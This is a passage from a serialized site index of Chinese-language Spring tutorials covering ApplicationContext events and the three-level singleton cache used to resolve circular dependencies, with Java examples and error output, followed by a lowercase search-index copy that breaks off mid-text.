已经初始化并且准备好接受请求。通常情况下，我们可以利用该事件来进行一些初始化操作。\n * contextstartedevent：表示 applicationcontext 正在启动。当应用程序中有需要在启动时执行的操作时，可以使用该事件进行处理。\n * contextstoppedevent：表示 applicationcontext 已停止。当需要在应用程序停止前执行某些操作时，可以使用该事件。\n * contextclosedevent：表示 applicationcontext 已经关闭。与 contextstoppedevent 不同，contextclosedevent 是在 applicationcontext 关闭之后发送的，它允许我们对资源进行完全释放。\n * requesthandledevent：表示一个 http 请求已经被处理完毕。该事件通常用于记录或统计请求处理的性能数据。\n\n在 spring 中，我们可以通过实现 applicationlistener 接口或使用 @eventlistener 注解来监听这些事件。以监听 contextrefreshedevent 为例，我们可以编写如下代码：\n\n@component\npublic class mylistener implements applicationlistener<contextrefreshedevent> {\n    @override\n    public void onapplicationevent(contextrefreshedevent event) {\n        // 在此处编写需要执行的逻辑\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n除了实现 applicationlistener 接口外，我们还可以使用 @eventlistener 注解来监听事件。例如，我们可以在 spring 组件中添加如下方法：\n\n@eventlistener\npublic void handlecontextrefreshedevent(contextrefreshedevent event) {\n    // 在此处编写需要执行的逻辑\n}\n\n\n1\n2\n3\n4\n\n\n要使用 spring 提供的类自定义一个事件发布和监听，首先，我们需要定义一个自定义事件。可以创建一个继承自 applicationevent 的类，并在其中添加自定义字段和方法\n\npublic class mycustomevent extends applicationevent {\n    private string message;\n    public mycustomevent(object source, string message) {\n        super(source);\n        this.message = message;\n    }\n    public string getmessage() {\n        return message;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n发布事件 一旦定义了自定义事件，我们就可以使用 applicationcontext 的 publishevent 方法来发布事件\n\n@autowired\nprivate applicationcontext applicationcontext;\n\npublic void dosomethingandpublishevent() {\n    // 在此处执行业务逻辑\n    mycustomevent event = new mycustomevent(this, "hello, world!");\n    applicationcontext.publishevent(event);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n监听事件 最后，我们需要创建一个事件监听器，以便处理自定义事件。可以创建一个实现 applicationlistener 接口的类，并在其 onapplicationevent 方法中添加处理逻辑\n\n@component\npublic class mycustomeventlistener implements applicationlistener<mycustomevent> {\n    @override\n    public void onapplicationevent(mycustomevent event) {\n        system.out.println("received custom event - " + event.getmessage());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n这样，当 mycustomevent 事件被发布时，mycustomeventlistener 就会收到该事件并调用其 onapplicationevent 方法进行处理。',charsets:{cjk:!0}},{title:"核心内容拆解 三级缓存",frontmatter:{title:"核心内容拆解 三级缓存",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/203/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/203.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98.html",relativePath:"00.java/20.Spring/21.spring/203.核心内容拆解 三级缓存.md",key:"v-c385f750",path:"/spring/spring/203/",headers:[{level:2,title:"代码介绍",slug:"代码介绍",normalizedTitle:"代码介绍",charIndex:679},{level:2,title:"流程介绍",slug:"流程介绍",normalizedTitle:"流程介绍",charIndex:7320},{level:2,title:"不同的循环依赖问题",slug:"不同的循环依赖问题",normalizedTitle:"不同的循环依赖问题",charIndex:10231},{level:3,title:"set 循环依赖",slug:"set-循环依赖",normalizedTitle:"set 循环依赖",charIndex:10245},{level:3,title:"构造器 循环依赖",slug:"构造器-循环依赖",normalizedTitle:"构造器 循环依赖",charIndex:11876},{level:3,title:"@DependsOn",slug:"dependson",normalizedTitle:"@dependson",charIndex:14362}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"代码介绍 流程介绍 不同的循环依赖问题 set 循环依赖 构造器 循环依赖 @DependsOn",content:"Spring 三级缓存是 Spring 框架中用于管理 Bean 对象的缓存机制。它由三个不同的缓存区域组成，分别是 singletonObjects、earlySingletonObjects 和 singletonFactories。\n\n * singletonObjects（一级缓存，成品对象）：单例对象缓存区域存储已经完全初始化后的单例对象。当第一次使用 getBean () 方法获取 bean 时，Spring 会尝试从这个缓存区获取对象，如果能够找到，则直接返回该对象实例。\n * earlySingletonObjects（二级缓存，代理对象，特殊的成品对象）：如果一个单例对象需要引用另一个单例对象，但后者尚未被完全初始化，那么容器将创建一个代理对象（Proxy Object），并将其放到 earlySingletonObjects 中。这个代理对象会暴露与实际对象相同的接口，并且能够对其进行一些基本操作，但是它还没有被完全初始化。\n * singletonFactories（三级缓存，半成品对象也是工厂对象）：单例工厂缓存区域存储创建 bean 实例的 ObjectFactory。在 Bean 依赖关系的创建过程中，如果 A 依赖 B，B 又依赖 A，那么在创建 A 和 B 的过程中就会出现循环依赖的问题。Spring 就是通过提前暴露一个未完成初始化的 Bean 来解决这个问题的。\n\n提示\n\n对于 spring 设计没有完全理解的同学可能很难明白以上的话，还是需要用代码加一说明，以下文章会议代码的方式全程讲清楚\n\n\n# 代码介绍\n\n首先 Spring 在初始化的时候会先把所有 Bean 加载到 Beandefinition 的缓存中，后续所有对 Bean 的创建都是从 Beandefinition 中获取详细可以看 Spring 源码阅读（一） ，然后再进行 Bean 生命周期的过程，创建好 Bean 的实例放入到 singletonObjects 缓存中，但是代码的第一步都是从获取开始，只有获取不到我才创建\n\n    public Object getBean(String name) throws BeansException {\n        return doGetBean(name, null);\n    }\n\n    public Object getBean(String name, Object... args) throws BeansException {\n        return doGetBean(name, args);\n    }\n\n    public <T> T getBean(String name, Class<T> requiredType) throws BeansException {\n        return (T) getBean(name);\n    }\n\n    protected <T> T doGetBean(final String name, final Object[] args) {\n        // 从缓存中获取实例\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // 如果实现了 FactoryBean，则需要调用 FactoryBean#getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // 从BeanDefinition列表中获取对象\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        // Bean实例的创建过程\n        Object bean = doCreateBean(name, beanDefinition, args);\n        // 如果实现了 FactoryBean，则需要调用 FactoryBean#getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n可以看到 getSingleton 方法就是获取单例，一旦有则直接返回，但第一次肯定是没有的，详细看下他的获取方式\n\n    public Object getSingleton(String beanName) {\n        // 从一级缓存中获取\n        Object singletonObject = singletonObjects.get(beanName);\n        if (null == singletonObject) {\n            singletonObject = earlySingletonObjects.get(beanName);\n            // 判断二级缓存中是否有对象，这个对象就是代理对象，因为只有代理对象才会放到三级缓存中\n            if (null == singletonObject) {\n                ObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\n                if (singletonFactory != null) {\n                    singletonObject = singletonFactory.getObject();\n                    // 把三级缓存中的代理对象中的真实对象获取出来，放入二级缓存中\n                    earlySingletonObjects.put(beanName, singletonObject);\n                    singletonFactories.remove(beanName);\n                }\n            }\n        }\n        return singletonObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n没有获取到实例则从 beanDefinition 中获取 Bean 的定义信息调用 doCreateBean 创建 Bean 的实例\n\n    protected Object doCreateBean(String beanName, BeanDefinition beanDefinition, Object[] args) {\n        Object bean = null;\n        try {\n            // 实例化 Bean\n            bean = createBeanInstance(beanDefinition, beanName, args);\n            // 处理循环依赖，将实例化后的Bean对象提前放入缓存中暴露出来\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // 是否需要继续进行后续的属性填充\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n            // 在设置 Bean 属性之前，允许 BeanPostProcessor 修改属性值（注解属性填充）\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // 给 Bean 填充属性（xml属性填充）\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // 执行 Bean 的初始化方法和 BeanPostProcessor 的前置和后置处理方法\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException(\"Instantiation of bean failed\", e);\n        }\n        // 注册实现了 DisposableBean 接口的 Bean 对象\n        registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n        // 判断 SCOPE_SINGLETON、SCOPE_PROTOTYPE\n        Object exposedObject = bean;\n        if (beanDefinition.isSingleton()) {\n            // 获取代理对象\n            exposedObject = getSingleton(beanName);\n            registerSingleton(beanName, exposedObject);\n        }\n        return exposedObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n其中 applyPropertyValues 这个方法，对要创建的实例进行属性填充的时候会进入循环依赖的问题，一旦遇到是 BeanReference 类型的，则会调用 getBean 方法去获取实例，该方法又会回到上面的方法。\n\n    protected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        try {\n            // 这里获取到  bean 信息里的属性有哪些，也就是一个对象有哪些属性，并循环赋值到所创建实例的属性中去\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                String name = propertyValue.getName();\n                Object value = propertyValue.getValue();\n                if (value instanceof BeanReference) {\n                    // A 依赖 B，获取 B 的实例化\n                    BeanReference beanReference = (BeanReference) value;\n                    value = getBean(beanReference.getBeanName());\n                }\n                // 类型转换，不是侧重点可以不看\n                else {\n                    Class<?> sourceType = value.getClass();\n                    Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                    ConversionService conversionService = getConversionService();\n                    if (conversionService != null) {\n                        if (conversionService.canConvert(sourceType, targetType)) {\n                            value = conversionService.convert(value, targetType);\n                        }\n                    }\n                }\n                // 反射设置属性填充\n                 BeanUtil.setFieldValue(bean, name, value);\n            }\n        } catch (Exception e) {\n            throw new BeansException(\"Error setting property values：\" + beanName + \" message：\" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n当一个实例的创建基本完成，他会把自己添加到一级缓存对象，做为一个成品提供给其他方法使用。如下方法就是添加到一级缓存的过程，其中 getSingleton 在获取三级缓存数据到二级缓存的时候会执行 singletonFactory.getObject (); 这是一个方法，会去执行 getEarlyBeanReference (beanName, beanDefinition, finalBean) 方法，该方法会得到工厂方法里面的一个代理对象。然后再把代理对象存到一级缓存。至此 Bean 的实例化到缓存的过程就结束。\n\n// 判断 SCOPE_SINGLETON、SCOPE_PROTOTYPE\nObject exposedObject = bean;\nif (beanDefinition.isSingleton()) {\n    // 把三级缓存对象转换为二级缓存对象\n    exposedObject = getSingleton(beanName);\n    // 把二级缓存对象转换为一级缓存对象\n    registerSingleton(beanName, exposedObject);\n}\n\n// getSingleton 的部分代码实现\nObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\nif (singletonFactory != null) {\n    // 获取代理对象\n    singletonObject = singletonFactory.getObject();\n    // 把三级缓存中的代理对象中的真实对象获取出来，放入二级缓存中\n    earlySingletonObjects.put(beanName, singletonObject);\n    singletonFactories.remove(beanName);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 流程介绍\n\n有了完整的概念后，我们可以考虑循环依赖的存在，当 A 依赖 B，B 又依赖 A，那么解决依赖的过程又是如何做的，可以看下图：\n\n\n\n 1. 会先在 getBean 方法里面找 A，通过一二三级缓存中寻找，如果找到则直接返回\n 2. 没找到就去创建 A 并放入 singletonFactories 三级缓存，会对 A 的属性值进行填充，此时 A 的属性依赖了 B，就要调用 getBean 找 B\n 3. 通过在 getBean 的 一二三级缓存查找，如果找到了直接返回\n 4. 没找到就去创建 B 并放入 singletonFactories 三级缓存，会对 B 的属性值进行填充，此时 B 的属性依赖了 A，就要调用 getBean 找 A\n 5. 此时的 A 已经在三级缓存，可以在三级缓存中找到，找到后会生成 A 代理对象 放入 earlySingletonObjects 二级缓存并返回这个代理对象\n 6. B 有了属性 A 的代理对象，此时 B 所有属性填充完毕后，就要把 B 添加到一级缓存，但此时的 B 在三级缓存，会先把三级缓存对象生成代理后放入到 earlySingletonObjects 二级缓存，再由二级缓存把对象放到 singletonObjects 一级缓存对象\n 7. 此时的 B 已经放到一级缓存对象了，并结束了 B 的创建流程，所以会返回到第 2 步，A 就有了 B 的实例，A 的属性填充完毕后，就要把 A 添加到一级缓存，但此时的 A 已经在二级缓存，所以就可以直接放入到 singletonObjects 一级缓存\n\n现在我们知道，按照 Spring 框架的设计，用于解决循环依赖需要用到三个缓存，这三个缓存分别存放了 singletonObjects 成品对象、singletonFactories 半成品对象 (未填充属性值)、earlySingletonObjects 代理对象，分阶段存放对象内容，来解决循环依赖问题。\n\n那么，这里我们需要知道一个核心的原理，就是用于解决循环依赖就必须是三级缓存呢，二级行吗？一级可以不？其实都能解决，只不过 Spring 框架的实现要保证几个事情，如只有一级缓存处理流程没法拆分，复杂度也会增加，同时半成品对象可能会有空指针异常。而将半成品与成品对象分开，处理起来也更加优雅、简单、易扩展。另外 Spring 的两大特性中不仅有 IOC 还有 AOP，也就是基于字节码增强后的方法，该存放到哪，而三级缓存最主要，要解决的循环依赖就是对 AOP 的处理，但如果把 AOP 代理对象的创建提前，那么二级缓存也一样可以解决。但是，这就违背了 Spring 创建对象的原则，Spring 更喜欢把所有的普通 Bean 都初始化完成，在处理代理对象的初始化。\n\n一个单个缓存解决循环依赖的例子\n\npublic class ForRelyOn {\n\n    static Map<String,Object> singletonObjects = new HashMap<>();\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(getBean(A.class).getB());\n        System.out.println(getBean(B.class).getA());\n    }\n\n    private static <T> T getBean(Class<T> beanClass) throws Exception {\n        String beanName = beanClass.getSimpleName().toLowerCase();\n        if (singletonObjects.containsKey(beanName)) {\n            return (T) singletonObjects.get(beanName);\n        }\n        // 实例化对象入缓存0\n        Object obj = beanClass.newInstance();\n        singletonObjects.put(beanName, obj);\n        // 属性填充补全对象\n        Field[] fields = obj.getClass().getDeclaredFields();\n        for (Field field : fields) {\n            field.setAccessible(true);\n            Class<?> fieldClass = field.getType();\n            String fieldBeanName = fieldClass.getSimpleName().toLowerCase();\n            field.set(obj, singletonObjects.containsKey(fieldBeanName) ? singletonObjects.get(fieldBeanName) : getBean(fieldClass));\n            field.setAccessible(false);\n        }\n        return (T) obj;\n    }\n\n\n    static class A{\n        private B b;\n\n        public B getB() {\n            return b;\n        }\n\n        public void setB(B b) {\n            this.b = b;\n        }\n    }\n\n    static class B{\n        private A a;\n\n        public A getA() {\n            return a;\n        }\n\n        public void setA(A a) {\n            this.a = a;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n提示\n\n以上都是我们通过 单例的 set 注入方式来解决循环依赖，在 spring 中有多种多样的注入情况，那会带来什么样的情况呢？\n\n\n# 不同的循环依赖问题\n\n\n# set 循环依赖\n\n在多例 set 的循环依赖中，只有多例和多例循环依赖会出现报错，报错信息如下：\n\nError creating bean with name 'b': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'a': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'b': Requested bean is currently in creation: Is there an unresolvable circular reference?\n\n\n1\n\n\n多例和单例的循环依赖不会有问题，如下是一个单例和多例的循环依赖代码：\n\n@Component\npublic class A {\n    @Resource\n    private B b;\n    public void getb() {\n        System.out.println(b);\n    }\n}\n\n@Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n@Component\npublic class B {\n    @Resource\n    private A a;\n    public void geta(){\n        System.out.println(a);\n    }\n}\n\npublic static void main(String[] args) {\n    ConfigurableApplicationContext run = SpringApplication.run(AdminApplication.class, args);\n    B b = run.getBean(B.class);\n    B b1 = run.getBean(B.class);\n    B b2 = run.getBean(B.class);\n    A a = run.getBean(A.class);\n    A a1 = run.getBean(A.class);\n    A a2 = run.getBean(A.class);\n    System.out.println(b);\n    System.out.println(b1);\n    System.out.println(b2);\n    a.getb();\n    a1.getb();\n    a2.getb();\n}\n\n// 结果\ncom.wt.admin.controller.B@1e5e2e06\ncom.wt.admin.controller.B@26c1f3eb\ncom.wt.admin.controller.B@79982bcc\ncom.wt.admin.controller.B@16b2d182\ncom.wt.admin.controller.B@16b2d182\ncom.wt.admin.controller.B@16b2d182\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 构造器 循环依赖\n\n但在 构造器 循环依赖的注入中，因为在构造器注入方式下，需要先创建一个 Bean 对象，然后再将其他 Bean 注入该对象中。但是，如果两个 Bean 都互相依赖，那么就会出现无法创建任何一个 Bean 的情况。因此，Spring 在这种情况下会抛出异常以避免程序出现不可预测的错误。\n\n@Configuration\npublic class Config {\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// 报错\nThe dependencies of some of the beans in the application context form a cycle:\n┌─────┐\n|  a defined in class path resource [com/wt/admin/controller/Config.class]\n↑     ↓\n|  b defined in class path resource [com/wt/admin/controller/Config.class]\n└─────┘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n解决这种问题，可以通过在方法中添加 @Lazy 注解，只能加到方法里，不能加到 @Bean 的上下位置，否则依然会报循环依赖；这种方式尽可能的被定义为 @Lazy 的 Bean 在第一次被使用的时候在去进行实例化。\n\n构造器也存在多例和单例的问题，如果你是多例依赖循环，会报错，如下\n\n// 多例\n@Configuration\npublic class Config {\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// 报错信息\nError creating bean with name 'b' defined in class path resource [com/wt/admin/controller/Config.class]: Unsatisfied dependency expressed through method 'b' parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'a' defined in class path resource [com/wt/admin/controller/Config.class]: Unsatisfied dependency expressed through method 'a' parameter 0; nested exception is org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name 'b': Requested bean is currently in creation: Is there an unresolvable circular reference?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n如果你是多例和单例循环依赖，也会报错，但这里和我们使用注解进行多例和单例的循环依赖测试结果就有所不同了\n\n@Configuration\npublic class Config {\n    @Scope(ConfigurableBeanFactory.SCOPE_PROTOTYPE)\n    @Bean\n    public A a(B b){\n        return new A(b);\n    }\n    @Bean\n    public B b(A a){\n        return new B(a);\n    }\n}\n// 报错信息\nThe dependencies of some of the beans in the application context form a cycle:\n┌─────┐\n|  b defined in class path resource [com/wt/admin/controller/Config.class]\n↑     ↓\n|  a defined in class path resource [com/wt/admin/controller/Config.class]\n└─────┘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n那么构造器和 set 注入的方式在多例和单例的结论如下：\n\n * 单例循环依赖：构造器的方式会报错（可以用 @Lazy 解决），set 注入的方式不会报错\n * 多例循环依赖：构造器的方式会报错，set 注入的方式会报错，两者都是调用对象时才报\n * 单例和多例循环依赖：构造器的方式会报错（可以用 @Lazy 解决），set 注入的方式不会报错\n\n\n# @DependsOn\n\n@DependsOn 注解可以定义在类和⽅法上，意思是我这个组件要依赖于另⼀个组件，也就是说被依赖的组件会⽐该组件先注册到 IOC 容器中。如下案例，因为两个都要先于，所以造成了循环依赖\n\n@DependsOn(\"b\")\n@Component\npublic class A {\n    @Resource\n    private B b;\n    public void getb() {\n        System.out.println(b);\n    }\n}\n\n@DependsOn(\"a\")\n@Component\npublic class B {\n    @Resource\n    private A a;\n    public void geta(){\n        System.out.println(a);\n    }\n}\n// 报错\nError creating bean with name 'b' defined in file [D:\\workspace\\luckyDraw\\java\\target\\classes\\com\\wt\\admin\\controller\\B.class]: Circular depends-on relationship between 'b' and 'a'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n",normalizedContent:"spring 三级缓存是 spring 框架中用于管理 bean 对象的缓存机制。它由三个不同的缓存区域组成，分别是 singletonobjects、earlysingletonobjects 和 singletonfactories。\n\n * singletonobjects（一级缓存，成品对象）：单例对象缓存区域存储已经完全初始化后的单例对象。当第一次使用 getbean () 方法获取 bean 时，spring 会尝试从这个缓存区获取对象，如果能够找到，则直接返回该对象实例。\n * earlysingletonobjects（二级缓存，代理对象，特殊的成品对象）：如果一个单例对象需要引用另一个单例对象，但后者尚未被完全初始化，那么容器将创建一个代理对象（proxy object），并将其放到 earlysingletonobjects 中。这个代理对象会暴露与实际对象相同的接口，并且能够对其进行一些基本操作，但是它还没有被完全初始化。\n * singletonfactories（三级缓存，半成品对象也是工厂对象）：单例工厂缓存区域存储创建 bean 实例的 objectfactory。在 bean 依赖关系的创建过程中，如果 a 依赖 b，b 又依赖 a，那么在创建 a 和 b 的过程中就会出现循环依赖的问题。spring 就是通过提前暴露一个未完成初始化的 bean 来解决这个问题的。\n\n提示\n\n对于 spring 设计没有完全理解的同学可能很难明白以上的话，还是需要用代码加一说明，以下文章会议代码的方式全程讲清楚\n\n\n# 代码介绍\n\n首先 spring 在初始化的时候会先把所有 bean 加载到 beandefinition 的缓存中，后续所有对 bean 的创建都是从 beandefinition 中获取详细可以看 spring 源码阅读（一） ，然后再进行 bean 生命周期的过程，创建好 bean 的实例放入到 singletonobjects 缓存中，但是代码的第一步都是从获取开始，只有获取不到我才创建\n\n    public object getbean(string name) throws beansexception {\n        return dogetbean(name, null);\n    }\n\n    public object getbean(string name, object... args) throws beansexception {\n        return dogetbean(name, args);\n    }\n\n    public <t> t getbean(string name, class<t> requiredtype) throws beansexception {\n        return (t) getbean(name);\n    }\n\n    protected <t> t dogetbean(final string name, final object[] args) {\n        // 从缓存中获取实例\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // 如果实现了 factorybean，则需要调用 factorybean#getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // 从beandefinition列表中获取对象\n        beandefinition beandefinition = getbeandefinition(name);\n        // bean实例的创建过程\n        object bean = docreatebean(name, beandefinition, args);\n        // 如果实现了 factorybean，则需要调用 factorybean#getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n可以看到 getsingleton 方法就是获取单例，一旦有则直接返回，但第一次肯定是没有的，详细看下他的获取方式\n\n    public object getsingleton(string beanname) {\n        // 从一级缓存中获取\n        object singletonobject = singletonobjects.get(beanname);\n        if (null == singletonobject) {\n            singletonobject = earlysingletonobjects.get(beanname);\n            // 判断二级缓存中是否有对象，这个对象就是代理对象，因为只有代理对象才会放到三级缓存中\n            if (null == singletonobject) {\n                objectfactory<?> singletonfactory = singletonfactories.get(beanname);\n                if (singletonfactory != null) {\n                    singletonobject = singletonfactory.getobject();\n                    // 把三级缓存中的代理对象中的真实对象获取出来，放入二级缓存中\n                    earlysingletonobjects.put(beanname, singletonobject);\n                    singletonfactories.remove(beanname);\n                }\n            }\n        }\n        return singletonobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n没有获取到实例则从 beandefinition 中获取 bean 的定义信息调用 docreatebean 创建 bean 的实例\n\n    protected object docreatebean(string beanname, beandefinition beandefinition, object[] args) {\n        object bean = null;\n        try {\n            // 实例化 bean\n            bean = createbeaninstance(beandefinition, beanname, args);\n            // 处理循环依赖，将实例化后的bean对象提前放入缓存中暴露出来\n            if (beandefinition.issingleton()) {\n                object finalbean = bean;\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // 是否需要继续进行后续的属性填充\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n            // 在设置 bean 属性之前，允许 beanpostprocessor 修改属性值（注解属性填充）\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // 给 bean 填充属性（xml属性填充）\n            applypropertyvalues(beanname, bean, beandefinition);\n            // 执行 bean 的初始化方法和 beanpostprocessor 的前置和后置处理方法\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception(\"instantiation of bean failed\", e);\n        }\n        // 注册实现了 disposablebean 接口的 bean 对象\n        registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n        // 判断 scope_singleton、scope_prototype\n        object exposedobject = bean;\n        if (beandefinition.issingleton()) {\n            // 获取代理对象\n            exposedobject = getsingleton(beanname);\n            registersingleton(beanname, exposedobject);\n        }\n        return exposedobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n其中 applypropertyvalues 这个方法，对要创建的实例进行属性填充的时候会进入循环依赖的问题，一旦遇到是 beanreference 类型的，则会调用 getbean 方法去获取实例，该方法又会回到上面的方法。\n\n    protected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        try {\n            // 这里获取到  bean 信息里的属性有哪些，也就是一个对象有哪些属性，并循环赋值到所创建实例的属性中去\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                string name = propertyvalue.getname();\n                object value = propertyvalue.getvalue();\n                if (value instanceof beanreference) {\n                    // a 依赖 b，获取 b 的实例化\n                    beanreference beanreference = (beanreference) value;\n                    value = getbean(beanreference.getbeanname());\n                }\n                // 类型转换，不是侧重点可以不看\n                else {\n                    class<?> sourcetype = value.getclass();\n                    class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                    conversionservice conversionservice = getconversionservice();\n                    if (conversionservice != null) {\n                        if (conversionservice.canconvert(sourcetype, targettype)) {\n                            value = conversionservice.convert(value, targettype);\n                        }\n                    }\n                }\n                // 反射设置属性填充\n                 beanutil.setfieldvalue(bean, name, value);\n            }\n        } catch (exception e) {\n            throw new beansexception(\"error setting property values：\" + beanname + \" message：\" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n当一个实例的创建基本完成，他会把自己添加到一级缓存对象，做为一个成品提供给其他方法使用。如下方法就是添加到一级缓存的过程，其中 getsingleton 在获取三级缓存数据到二级缓存的时候会执行 singletonfactory.getobject (); 这是一个方法，会去执行 getearlybeanreference (beanname, beandefinition, finalbean) 方法，该方法会得到工厂方法里面的一个代理对象。然后再把代理对象存到一级缓存。至此 bean 的实例化到缓存的过程就结束。\n\n// 判断 scope_singleton、scope_prototype\nobject exposedobject = bean;\nif (beandefinition.issingleton()) {\n    // 把三级缓存对象转换为二级缓存对象\n    exposedobject = getsingleton(beanname);\n    // 把二级缓存对象转换为一级缓存对象\n    registersingleton(beanname, exposedobject);\n}\n\n// getsingleton 的部分代码实现\nobjectfactory<?> singletonfactory = singletonfactories.get(beanname);\nif (singletonfactory != null) {\n    // 获取代理对象\n    singletonobject = singletonfactory.getobject();\n    // 把三级缓存中的代理对象中的真实对象获取出来，放入二级缓存中\n    earlysingletonobjects.put(beanname, singletonobject);\n    singletonfactories.remove(beanname);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 流程介绍\n\n有了完整的概念后，我们可以考虑循环依赖的存在，当 a 依赖 b，b 又依赖 a，那么解决依赖的过程又是如何做的，可以看下图：\n\n\n\n 1. 会先在 getbean 方法里面找 a，通过一二三级缓存中寻找，如果找到则直接返回\n 2. 没找到就去创建 a 并放入 singletonfactories 三级缓存，会对 a 的属性值进行填充，此时 a 的属性依赖了 b，就要调用 getbean 找 b\n 3. 通过在 getbean 的 一二三级缓存查找，如果找到了直接返回\n 4. 没找到就去创建 b 并放入 singletonfactories 三级缓存，会对 